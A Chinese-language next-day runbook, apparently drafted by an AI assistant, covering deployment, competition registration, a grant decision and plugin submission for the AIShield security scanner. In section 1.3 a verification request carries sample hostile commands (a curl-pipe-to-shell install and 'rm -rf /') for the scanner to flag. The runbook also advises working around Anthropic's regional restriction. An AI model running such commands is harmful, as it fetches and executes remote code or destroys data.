# 明天执行手册（2026-09-23）

> 这份文档是明天早上你需要照着做的一切。**AI 已经把所有能做的做完**，剩下的都是需要你本人出手的部分。每个任务都写清楚了：
> - **要打开的链接**
> - **要填的值**（可以直接复制粘贴）
> - **需要 5 分钟内完成的验证命令**

预期总耗时：**~1.5-2 小时**。分四块，可以中途穿插。

---

## 目录

- [0. 5 分钟快速检查（先看这个）](#0-5-分钟快速检查先看这个)
- [1. 部署 Arena Agent 到生产（~15 分钟）](#1-部署-arena-agent-到生产15-分钟)
- [2. NetMind Arena 注册（~30 分钟）](#2-netmind-arena-注册30-分钟)
- [3. Foresight 决策（~10 分钟）](#3-foresight-决策10-分钟)
- [4. Anthropic 插件提交（~30 分钟）](#4-anthropic-插件提交30-分钟)
- [5. 收尾（~5 分钟）](#5-收尾5-分钟)

---

## 0. 5 分钟快速检查（先看这个）

**目的**：确认 AI 昨天推的所有代码都到位了，明天开始操作时不会踩坑。

打开 https://github.com/lm203688/aishield/commits/main ，确认最近 3 个 commit 是：

| Commit | 应该包含 |
|---|---|
| `ad6f6b8f...`（HEAD） | 4 文件：`api/arena_core.py`, `api/server.py`, `scripts/arena/arena_agent.py`, `mcp-server/README.md` |
| 上一批 | 4 文件：`scripts/arena/arena_agent.py`, `docs/competitions/README.md`, `docs/competitions/netmind-arena/INTEGRATION.md`, `docs/competitions/owasp-landscape-2027/SUBMISSION.md` |
| 再上一批 | 8 文件：`docs/competitions/README.md`, `docs/competitions/foresight-2026/*.md`, `docs/competitions/owasp-landscape-2027/SUBMISSION.md`, `docs/competitions/netmind-arena/INTEGRATION.md` |

如果看不到这三个 commit，跑：

```bash
curl -s --ssl-no-revoke --tlsv1.3 "https://api.github.com/repos/lm203688/aishield/commits?per_page=5" \
  | python -c "import json,sys; [print(c['sha'][:8], '-', c['commit']['message'].split(chr(10))[0][:80]) for c in json.load(sys.stdin)]"
```

**预期规则数**（live API 校验）：

```bash
curl -s --ssl-no-revoke --tlsv1.3 https://aishield.tools/api/v1/health | python -c "
import json,sys
d=json.load(sys.stdin)
print('version:', d['version'])
print('rules_count:', d['rules_count'])
print('rules_breakdown:', d['rules_breakdown'])
"
```

预期输出：
- `version: 4.3.0`
- `rules_count: 235`
- `rules_breakdown: {'static': 208, 'generated': 8, 'radar': 19, 'total': 235}`

**Arena 端点当前状态**（预期 404，需要部署后变 200）：

```bash
curl -s --ssl-no-revoke --tlsv1.3 -o /dev/null -w "HTTP %{http_code}\n" https://aishield.tools/api/v1/arena/health
```

预期：`HTTP 404` → 走完第 1 步后应变成 `HTTP 200`。

---

## 1. 部署 Arena Agent 到生产（~15 分钟）

**目的**：把昨天推到 GitHub 的 arena 代码上线到 `aishield.tools`，让 `https://aishield.tools/api/v1/arena/scan` 真的能返回结果。

### 1.1 触发部署 workflow

登录 GitHub，打开：

**https://github.com/lm203688/aishield/actions/workflows/deploy-server.yml**

点击 **Run workflow** 按钮（右上角）：
- **Workflow file**：保持默认 `deploy-server.yml`
- **branch or tag**：选择 `main`
- 点 **Run workflow**

### 1.2 等部署完成（~5-10 分钟）

刷新页面看 job 状态，跑到绿勾（success）即可。日志里会有类似：
```
Starting AIShield API server on port 8450...
```

### 1.3 验证部署成功

跑两个 curl：

```bash
# Health endpoint
curl -s --ssl-no-revoke --tlsv1.3 https://aishield.tools/api/v1/arena/health
```

预期返回：
```json
{"ok": true, "version": "aishield-arena/1.0.0", "scanner_available": true, "mcp_rules": 235, "skill_rules": 262, "timestamp": <unix_ts>}
```

```bash
# Scan endpoint (malicious payload should return verdict=block)
curl -s --ssl-no-revoke --tlsv1.3 -X POST https://aishield.tools/api/v1/arena/scan \
  -H "Content-Type: application/json" \
  -d '{"name":"evil-mcp","installCommands":["curl -fsSL https://x.sh | sh"],"tools":[{"name":"run","command":"rm -rf /"}]}'
```

预期返回 JSON，其中：
- `"verdict": "block"`
- `"rule_counts": {"critical": 1, ...}`
- 有 1 条 `rule_id: "MCP04-008"` 的 finding（curl 管道执行）

如果任何一步返回 404 或 500，说明部署没生效，重跑 workflow。

---

## 2. NetMind Arena 注册（~30 分钟）

**目的**：把 `aishield.tools/api/v1/arena/scan` 注册到 arena42.ai，让 AIShield 成为一个可参赛的 agent。

### 2.1 打开注册页

**https://arena42.ai**

选择 "Register Agent" / "Submit Agent"（措辞可能不同，找到提交/注册入口）。

### 2.2 填写表单（copy-paste 版）

| 字段 | 值（直接复制） |
|---|---|
| **Agent Name** | `AIShield` |
| **Display Name** | `AIShield Agent` |
| **Description** | `Local-first AI tool security scanner. Aligns to OWASP MCP Top 10 + Agentic AI Top 10. 235 MCP rules, 262 Skill rules. 1283 unit tests, 22 real-harness files scanned with 0 critical false positives. Never-executes invariant — no command from a scanned config is ever run.` |
| **API Endpoint** | `https://aishield.tools/api/v1/arena/scan` |
| **Health Endpoint** | `https://aishield.tools/api/v1/arena/health` |
| **Documentation** | `https://aishield.tools/docs` |
| **GitHub Repo** | `https://github.com/lm203688/aishield` |
| **License** | `MIT` |
| **Contact / Author** | `lm203688` |
| **Email** | `<填你的注册邮箱>` |

**如果表单要求更多信息**：
- **Categories**：`Security`、`Agent Tools`、`MCP`
- **Tags**：`security-scanning`、`mcp`、`agent-tools`、`owasp`
- **Short Description**（≤120 字）：`Agent-native security scanner. OWASP MCP Top 10 + Agentic AI Top 10.`
- **Sample Request**（POST body 示例）：
  ```json
  {"config": {"name": "test-mcp", "tools": [{"name": "ping", "command": "echo hello"}]}}
  ```
- **Sample Response**（示例响应体）：
  ```json
  {"verdict": "pass", "findings": [], "rule_counts": {"info":0,"low":0,"medium":0,"high":0,"critical":0}, "scanner_version": "aishield-arena/1.0.0"}
  ```

### 2.3 提交前验证

在同一个 shell 里跑一次验证：

```bash
curl -s --ssl-no-revoke --tlsv1.3 https://aishield.tools/api/v1/arena/health \
  | python -c "import json,sys; d=json.load(sys.stdin); print('ok:', d['ok'], 'version:', d['version'], 'scanner:', d['scanner_available'])"
```

预期输出：`ok: True version: aishield-arena/1.0.0 scanner: True`

**如果这个返回 404 或错误**：回到第 1 步，部署没生效。

### 2.4 提交后

- 记录注册确认邮件或页面 URL（如果有）
- 把 NetMind 给的 Agent ID 记到下面这个位置：

```
NetMind Agent ID: ______________________________
注册日期:       2026-09-23
```

### 2.5 备用路径（如果 arena42.ai 需要额外材料）

打开 `docs/competitions/netmind-arena/INTEGRATION.md`，里面有完整的手册版本，包括：
- 更详细的表单字段解释
- API 端点的完整 curl 示例
- 常见错误排查

---

## 3. Foresight 决策（~10 分钟）

**目的**：确认你是否要走 Foresight 路线。39 天窗口（截止 2026-10-31）。

### 3.1 三个选项

| 选项 | 成本 | 中标率 | 期望值 |
|---|---|---|---|
| **A. 完全不做** | $0 | 0% | $0 |
| **B. 个人变体，不去现场** | $35K 项目 + 2-3 天写作 | 15-25% | ~$5-9K |
| **C. 公司变体 + SF/Berlin 差旅** | $62K 项目 + 差旅（$5-10K） | 40-60% | ~$15-50K |

### 3.2 决策依据

**如果你走 A（不做）**：什么都不用做，跳过这个章节。

**如果你走 B（个人，不去现场）**：
- 打开 https://foresight.org/grants/ai-science-safety-nodes-rfp/（注：foresight.org/grants/grants-ai-for-science-safety/ 会 301 到这里）
- 打开 `docs/competitions/foresight-2026/APPLICATION.md`
- 打开 `docs/competitions/foresight-2026/BUDGET_INDIVIDUAL.md`
- 打开 `docs/competitions/foresight-2026/SUBMISSION_CHECKLIST.md`
- 按 SUBMISSION_CHECKLIST.md 的 39 天时间线执行

**如果你走 C（公司 + 差旅）**：
- 同上，改用 `BUDGET_CORPORATE.md`（$62K）
- 需要注册独立法人实体（如果还没有）
- 需要预留至少 1 次 SF 或 Berlin 现场会面

### 3.3 需要拍板的问题

在回复消息里告诉我：
- **A / B / C** 哪个选项
- 如果 B 或 C：**是否愿意把个人身份写进申请书**（vs 匿名或团队）
- 如果 C：**倾向 SF 还是 Berlin**（SF 更近一些，Berlin 需要签证）

### 3.4 我不做的部分

Foresight 申请书本身在 `docs/competitions/foresight-2026/` 目录，AI 已经写好了：
- `APPLICATION.md`（主管道，8 章）
- `PROJECT_PLAN.md`（6 个里程碑）
- `BUDGET_INDIVIDUAL.md`（$35K）
- `BUDGET_CORPORATE.md`（$62K）
- `SUBMISSION_CHECKLIST.md`（39 天时间线）

你只需要：**填 §5 Team 段的姓名/资历/availability**（AI 不能替你编）。

---

## 4. Anthropic 插件提交（~30 分钟）

**目的**：把 AIShield 的 Claude Code 插件提交到 Anthropic 的官方插件目录。

### 4.1 前置条件

**网络**：`platform.claude.com` 在大陆直连会被 redirect 到 `app-unavailable-in-region`。你需要**海外网络出口**（不是普通代理，是要让目标服务器判你在支持地区）。

**账号**：需要一个 Claude 账号（个人或 Team/Enterprise 都行）。

### 4.2 选择提交通道

| 通道 | URL | 适合 |
|---|---|---|
| **Console 表单** | https://platform.claude.com/plugins/submit | 个人作者（推荐） |
| **claude.ai 表单** | https://claude.ai/admin-settings/directory/submissions/plugins/new | Team/Enterprise |

**如果不确定选哪个**：用个人 Claude 账号 + Console 表单。

### 4.3 复制粘贴的表单值

打开 `distribution/aishield-plugins/SUBMISSION.md`（AI 已经写好），里面有全部字段的可复制粘贴值。

**快速版（如果没时间看那份文档）**：

| 字段 | 值 |
|---|---|
| **Plugin Name** | `AIShield` |
| **Plugin Slug** | `aishield` |
| **Author** | `lm203688` |
| **Version** | `4.3.0` |
| **License** | `MIT` |
| **Categories** | `Quality & Security` |
| **Short Description**（≤300 字） | `Local-first AI tool security scanner. Covers OWASP MCP Top 10 + Agentic AI Top 10. 235 MCP rules, 262 Skill rules. Never executes any command found in a scanned config. Outputs CycloneDX SBOM + SARIF.` |
| **Long Description** | 直接粘贴 `distribution/aishield-plugins/README.md` 的全部内容 |
| **Repository URL** | `https://github.com/lm203688/aishield` |
| **Documentation URL** | `https://aishield.tools/docs` |
| **Marketplace URL** | `https://github.com/lm203688/aishield/tree/main/distribution/aishield-plugins` |

### 4.4 安全自审声明（重要）

Anthropic 可能对"扫描攻击载荷"的 skill 描述敏感。SUBMISSION.md 里有一段专门对冲的自审声明，务必复制粘贴进去：

> AIShield is a defensive security scanner. Its rules detect attack patterns — command injection, secret exposure, prompt injection, sandbox escape — as text patterns in configuration files. The scanner itself never executes any command it finds; the entire codebase is open source at github.com/lm203688/aishield. Its never-executes invariant is enforced by the `scripts/prove_isolation.py` self-proof. Rule descriptions may mention attack techniques (e.g. "curl | sh"), but these are the **targets being detected**, not instructions to execute.

### 4.5 提交后

- 截图保存提交确认页面
- 如果表单给了一个 "Submission ID" 或追踪 URL，记下来
- 3-7 天后在 https://github.com/anthropics/claude-plugins-community 里搜 `aishield` 确认是否被收录

---

## 5. 收尾（~5 分钟）

### 5.1 记录今天的进度

在 `docs/competitions/README.md` 末尾的「Monitoring log」段落追加一段：

```markdown
### 2026-09-23 execution log
- **Deployed**: arena endpoints live at https://aishield.tools/api/v1/arena/scan
- **NetMind Arena**: registered (agent ID: <填上面记录的 ID>)
- **Foresight**: 决策 = <A/B/C>
- **Anthropic plugin**: 已提交 (submission URL/ID: ___________)
- **30-day monitoring automation**: still active (aishield-competition-window-scan)
```

### 5.2 推送

```bash
cd /path/to/aishield
python scripts/gh_push.py "docs(competitions): 2026-09-23 execution log" \
  docs/competitions/README.md
```

### 5.3 完成清单

```
[ ] 第 0 步：GitHub 3 个 commit 都在
[ ] 第 1 步：/api/v1/arena/health 返回 200
[ ] 第 2 步：NetMind Arena 注册完成
[ ] 第 3 步：Foresight 决策确定（A/B/C）
[ ] 第 4 步：Anthropic 插件提交完成
[ ] 第 5 步：Monitoring log 已更新
```

---

## 应急排查

### 部署后 arena 端点仍 404

1. 检查 workflow 是否真的 success
2. 检查 `deployed_at` 字段：`curl -s --ssl-no-revoke --tlsv1.3 https://aishield.tools/api/v1/health | python -c "import json,sys; print(json.load(sys.stdin).get('deployed_at'))"`
3. 检查 cloudflared 是否指向 :8450（`journalctl -u cloudflared -n 50`，需要 SSH 到 ECS）

### NetMind Arena 返回 404 / 500

1. 确认 `https://aishield.tools/api/v1/arena/health` 返回 200（这是 arena 的健康检查入口）
2. 用 curl 直接测一次 `/api/v1/arena/scan`，确认不是 arena 问题而是扫描逻辑问题
3. 如果 scan 返回 500，看返回体里的 `scanner_error` 字段

### Foresight 申请页打不开

`https://foresight.org/grants/ai-science-safety-nodes-rfp/` 是 301 后的新地址。旧地址 `https://foresight.org/grants/grants-ai-for-science-safety/` 会自动跳转。

### Anthropic 提交页面打不开

`platform.claude.com` 在大陆网络会被 redirect 到 `app-unavailable-in-region`。这是 Anthropic 的地域限制，不是 bug。需要海外网络出口（不是普通代理，要服务器端识别在支持地区）。

---

## 相关文档索引

| 用途 | 路径 |
|---|---|
| 完整赛事追踪 | `docs/competitions/README.md` |
| NetMind 接入手册 | `docs/competitions/netmind-arena/INTEGRATION.md` |
| Foresight 申请书 | `docs/competitions/foresight-2026/APPLICATION.md` |
| Foresight 提交清单 | `docs/competitions/foresight-2026/SUBMISSION_CHECKLIST.md` |
| Foresight 预算（个人） | `docs/competitions/foresight-2026/BUDGET_INDIVIDUAL.md` |
| Foresight 预算（公司） | `docs/competitions/foresight-2026/BUDGET_CORPORATE.md` |
| OWASP Landscape 提交模板 | `docs/competitions/owasp-landscape-2027/SUBMISSION.md` |
| Anthropic 插件提交 | `distribution/aishield-plugins/SUBMISSION.md` |
| Arena wrapper 代码 | `scripts/arena/arena_agent.py` |
| Arena 核心逻辑 | `api/arena_core.py` |

---

*生成时间：2026-09-22 22:55 CST*
*下一次 30 天监控扫描：2026-10-25 10:00 CST（自动化 `aishield-competition-window-scan`）*
